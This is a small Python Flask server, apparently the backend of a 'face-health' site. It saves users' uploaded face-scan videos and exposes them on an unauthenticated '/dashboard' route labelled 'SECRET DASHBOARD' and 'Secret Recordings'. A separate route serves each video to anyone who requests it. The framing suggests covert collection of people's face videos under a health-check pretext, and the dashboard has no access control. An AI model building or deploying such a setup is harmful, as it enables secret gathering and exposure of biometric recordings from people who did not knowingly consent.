from flask import Flask, request, send_from_directory, jsonify
from flask_cors import CORS
import os
from datetime import datetime

# --- Folder Setup ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
FRONTEND_DIR = os.path.join(BASE_DIR, '..', 'face-health-frontend')
FRONTEND_DIR = os.path.abspath(FRONTEND_DIR)
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')

app = Flask(__name__, static_folder=FRONTEND_DIR)
CORS(app)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# 1. Main Website
@app.route('/')
def serve_index():
    file_path = os.path.join(FRONTEND_DIR, 'index.html')
    if not os.path.exists(file_path):
        return jsonify({
            "Error": "index.html not found!",
            "Server is looking in": FRONTEND_DIR,
            "Files in Frontend": os.listdir(FRONTEND_DIR) if os.path.exists(FRONTEND_DIR) else "Folder Missing"
        })
    return send_from_directory(FRONTEND_DIR, 'index.html')

# 2. Static Files (JS/CSS)
@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory(FRONTEND_DIR, path)

# 3. Video Upload
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'video' not in request.files:
        return jsonify({"status": "error", "message": "No video uploaded"}), 400
    file = request.files['video']
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"scan_{timestamp}.webm"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    return jsonify({"status": "success", "filename": filename}), 200

# 4. SECRET DASHBOARD (Yahan sab videos dikhengi)
@app.route('/dashboard')
def dashboard():
    if not os.path.exists(UPLOAD_FOLDER):
        return "<h3>No uploads folder created yet.</h3>"
    
    files = os.listdir(UPLOAD_FOLDER)
    if not files:
        return "<h3>No videos recorded yet. Go to home page and record one!</h3>"
        
    # Simple HTML list to show videos
    html = """
    <body style="background: #0f172a; color: white; font-family: sans-serif; padding: 20px;">
        <h1>🕵️‍♂️ Secret Recordings</h1>
        <ul style="list-style: none; padding: 0;">
    """
    for f in files:
        html += f'<li style="margin: 10px 0;"><a href="/videos/{f}" target="_blank" style="color: #4ade80; text-decoration: none; font-size: 18px;">🎥 {f}</a></li>'
    html += "</ul></body>"
    return html

# 5. Video Play Karne Ke Liye Route
@app.route('/videos/<filename>')
def view_video(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)